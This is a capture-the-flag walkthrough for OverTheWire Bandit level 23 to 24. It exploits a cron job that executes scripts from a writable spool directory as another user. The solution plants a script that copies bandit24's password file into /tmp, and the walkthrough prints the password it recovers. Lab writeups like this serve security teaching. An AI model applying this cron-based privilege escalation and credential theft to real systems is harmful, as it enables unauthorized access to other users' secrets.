# Level Goal

A program is running automatically at regular intervals from cron, the time-based job scheduler. Look in /etc/cron.d/ for the configuration and see what command is being executed.

NOTE: This level requires you to create your own first shell-script. This is a very big step and you should be proud of yourself when you beat this level!

NOTE 2: Keep in mind that your shell script is removed once executed, so you may want to keep a copy around…

# Solution

As with the previous 2 levels, we only need to write a script here.
```
bandit23@bandit:~$ cat /etc/cron.d/cronjob_bandit24
@reboot bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
* * * * * bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
```
Running as bandit24, every minute and at reboot.

```
bandit23@bandit:~$ ls -l /usr/bin/cronjob_bandit24.sh
-rwxr-x--- 1 bandit24 bandit23 438 Apr  3 15:17 /usr/bin/cronjob_bandit24.sh
bandit23@bandit:~$ cat /usr/bin/cronjob_bandit24.sh
#!/bin/bash

shopt -s nullglob

myname=$(whoami)

cd /var/spool/"$myname"/foo || exit 
echo "Executing and deleting all scripts in /var/spool/$myname/foo:"
for i in * .*;
do
    if [ "$i" != "." ] && [ "$i" != ".." ];
    then
        echo "Handling $i"
        owner="$(stat --format "%U" "./$i")"
        if [ "${owner}" = "bandit23" ] && [ -f "$i" ]; then
            timeout -s 9 60 "./$i"
        fi
        rm -rf "./$i"
    fi
done
```
Going to `/var/spool/bandit24/foo`, looking for the owner of the file. If the owner is bandit23, it will run the script with a 60-second timelimit.
```
bandit23@bandit:/var/spool/bandit24$ ls -l /var/spool/bandit24/
total 4
drwxrwx-wx 8 root bandit24 4096 Jun  8 08:40 foo
```
Write and execution permissions for bandit23; we can place our script there. 
The steps are as follows:
```
andit23@bandit:/var/spool/bandit24$ mktemp -d
/tmp/tmp.uxVu7PZUHe

bandit23@bandit:/var/spool/bandit24$ cd /tmp/tmp.uxVu7PZUHe

bandit23@bandit:/tmp/tmp.uxVu7PZUHe$ nano bandit24_pass.sh
#!/bin/bash

cat /etc/bandit_pass/bandit24 > /tmp/bandit24.txt
```

Give it the permissions and then copy this file to the `/var/spool/bandit24/foo` directory.

```
bandit23@bandit:/tmp/tmp.uxVu7PZUHe$ chmod 777 bandit24_pass.sh 
bandit23@bandit:/tmp/tmp.uxVu7PZUHe$ cp bandit24_pass.sh /var/spool/bandit24/foo/
bandit23@bandit:/tmp/tmp.uxVu7PZUHe$ cat /tmp/bandit24.txt
gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8
```
